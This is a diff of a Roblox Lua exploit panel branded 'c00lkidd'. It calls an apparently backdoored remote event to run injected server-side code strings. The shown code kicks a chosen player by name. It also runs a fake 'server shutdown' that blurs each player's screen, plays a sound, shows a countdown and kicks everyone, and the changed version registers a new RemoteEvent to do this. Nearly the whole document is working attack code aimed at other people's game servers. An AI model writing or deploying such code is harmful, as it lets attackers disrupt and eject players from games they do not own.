@@ -2712,7 +2712,7 @@ local function findPlayer(name)
 	return nil
 end
 
-local selectedPlayerLabel = CommandsMenu:Label("Selected Player: None")
+local selectedPlayerLabel = CommandsMenu:Label("Selected Player: N/A")
 
 CommandsMenu:Textbox("Target Player", "Username/Display", function(playertc)
 	selectedPlayer = findPlayer(playertc)
@@ -2725,7 +2725,7 @@ end)
 
 CommandsMenu:Button("Kick Player", function()
 	if selectedPlayer then
-		fireRemoteEvent('for i,v in pairs(game.Players:GetPlayers()) do if v.Name == "' .. selectedPlayer.Name .. '" then v:Kick("You have been kicked by c00lkidd panel") end end')
+		fireRemoteEvent('for i,v in pairs(game.Players:GetPlayers()) do if v.Name == "' .. selectedPlayer.Name .. '" then v:Kick("You have been kicked by c00lkidd admin panel") end end')
 	end
 end)
 
@@ -2742,7 +2742,8 @@ CommandsMenu:Button("D#ck Player", function()
 end)
 CommandsMenu:Button("Shutdown", function()
 	for _,v in pairs(game.Players:GetPlayers()) do 
-	      fireRemoteEvent('for _,p in pairs(game:GetService("Players"):GetPlayers())do coroutine.wrap(function()local t=game:GetService("TweenService")local l=game:GetService("Lighting")local b=Instance.new("BlurEffect",l)b.Size=24 local g=Instance.new("ScreenGui")g.Name="ShutdownGUI"g.ResetOnSpawn=false g.Parent=p:WaitForChild("PlayerGui")local f=Instance.new("Frame",g)f.Size=UDim2.new(1,0,1,0)f.BackgroundColor3=Color3.new(0,0,0)f.BackgroundTransparency=0.3 Instance.new("UICorner",f).CornerRadius=UDim.new(0,12)local i=Instance.new("ImageLabel",f)i.Size=UDim2.new(0,250,0,250)i.Position=UDim2.new(0.5,0,0.4,0)i.AnchorPoint=Vector2.new(0.5,0.5)i.BackgroundTransparency=1 i.Image="rbxassetid://8408806737"Instance.new("UICorner",i).CornerRadius=UDim.new(1,0)local m=Instance.new("TextLabel",f)m.Size=UDim2.new(1,0,0,60)m.Position=UDim2.new(0,0,0.7,0)m.BackgroundTransparency=1 m.Text=""m.TextColor3=Color3.fromRGB(255,64,64)m.TextStrokeTransparency=0.2 m.TextScaled=true m.Font=Enum.Font.RobotoMono m.RichText=true Instance.new("UIGradient",m).Color=ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromRGB(255,100,100)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,0,0))}local s=Instance.new("Sound",g)s.SoundId="rbxassetid://104483584177040"s.Volume=3 s:Play()local msg="c00lkidd.exe is shutting down the server..."for j=1,#msg do m.Text=string.sub(msg,1,j)wait(0.03)end local c=Instance.new("TextLabel",f)c.Size=UDim2.new(1,0,0,80)c.Position=UDim2.new(0,0,0.82,0)c.BackgroundTransparency=1 c.TextColor3=Color3.fromRGB(255,0,0)c.TextStrokeTransparency=0.1 c.TextScaled=true c.Font=Enum.Font.Arcade for k=5,0,-1 do c.Text="Shutting down in: "..math.floor(k*10+0.5)/10 local st=t:Create(i,TweenInfo.new(0.08),{Position=UDim2.new(0.5,math.random(-12,12),0.4,math.random(-12,12))})st:Play()local tt=t:Create(c,TweenInfo.new(0.08),{Position=UDim2.new(0,math.random(-10,10),0.82,math.random(-8,8))})tt:Play()wait(0.5)i.Position=UDim2.new(0.5,0,0.4,0)c.Position=UDim2.new(0,0,0.82,0)end p:Kick("c00lkidd.exe Shutdown via Command")end)()end')
+	      fireRemoteEvent('local shdown=Instance.new("RemoteEvent",game.ReplicatedStorage)shdown.Name="ShutdownEvent"game.ReplicatedStorage:WaitForChild("ShutdownEvent").OnServerEvent:Connect(function()for _,p in pairs(game:GetService("Players"):GetPlayers())do coroutine.wrap(function()local t=game:GetService("TweenService")local l=game:GetService("Lighting")local b=Instance.new("BlurEffect",l)b.Size=24 local g=Instance.new("ScreenGui")g.Name="ShutdownGUI"g.ResetOnSpawn=false g.Parent=p:FindFirstChildOfClass("PlayerGui")local f=Instance.new("Frame",g)f.Size=UDim2.new(1,0,1,0)f.BackgroundColor3=Color3.new(0,0,0)f.BackgroundTransparency=0.3 Instance.new("UICorner",f).CornerRadius=UDim.new(0,12)local i=Instance.new("ImageLabel",f)i.Size=UDim2.new(0,250,0,250)i.Position=UDim2.new(0.5,0,0.4,0)i.AnchorPoint=Vector2.new(0.5,0.5)i.BackgroundTransparency=1 i.Image="rbxassetid://8408806737"Instance.new("UICorner",i).CornerRadius=UDim.new(1,0)local tx=Instance.new("TextLabel",f)tx.Size=UDim2.new(1,0,0,60)tx.Position=UDim2.new(0,0,0.7,0)tx.BackgroundTransparency=1 tx.Text=""tx.TextColor3=Color3.fromRGB(255,64,64)tx.TextStrokeTransparency=0.2 tx.TextScaled=true tx.Font=Enum.Font.RobotoMono tx.RichText=true Instance.new("UIGradient",tx).Color=ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromRGB(255,100,100)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,0,0))}local s=Instance.new("Sound",g)s.SoundId="rbxassetid://104483584177040"s.Volume=3 s:Play()local m="c00lkidd.exe shutdown the server.."for j=1,#m do tx.Text=string.sub(m,1,j)wait(0.03)end local cd=Instance.new("TextLabel",f)cd.Size=UDim2.new(1,0,0,80)cd.Position=UDim2.new(0,0,0.82,0)cd.BackgroundTransparency=1 cd.TextColor3=Color3.fromRGB(255,0,0)cd.TextStrokeTransparency=0.1 cd.TextScaled=true cd.Font=Enum.Font.Arcade for k=5,0,-1 do cd.Text="Shutting down in: "..math.floor(k*10+0.5)/10 t:Create(i,TweenInfo.new(0.08),{Position=UDim2.new(0.5,math.random(-12,12),0.4,math.random(-12,12))}):Play()t:Create(cd,TweenInfo.new(0.08),{Position=UDim2.new(0,math.random(-10,10),0.82,math.random(-8,8))}):Play()wait(0.5)i.Position=UDim2.new(0.5,0,0.4,0)cd.Position=UDim2.new(0,0,0.82,0)end p:Kick("c00lkidd.exe Shutdown via command")end)()end end)')
+	      game:GetService("ReplicatedStorage").ShutdownEvent:FireServer()
 	end
 end)
 	end)
